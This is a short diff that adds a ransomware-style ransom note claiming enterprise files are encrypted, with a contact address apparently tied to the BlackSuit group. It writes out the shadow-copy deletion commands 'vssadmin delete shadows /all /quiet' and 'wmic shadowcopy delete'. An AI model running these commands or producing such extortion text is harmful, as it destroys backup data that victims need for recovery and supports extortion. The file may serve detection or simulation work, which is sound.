@@ -1,0 +1,5 @@
+WARNING: All your enterprise files have been encrypted using AES-256 and RSA-4096.
+Command executed: vssadmin delete shadows /all /quiet
+wmic shadowcopy delete
+Do not restart your computer or attempt recovery.
+Contact key recovery: blacksuit_decryptor@onion.mail
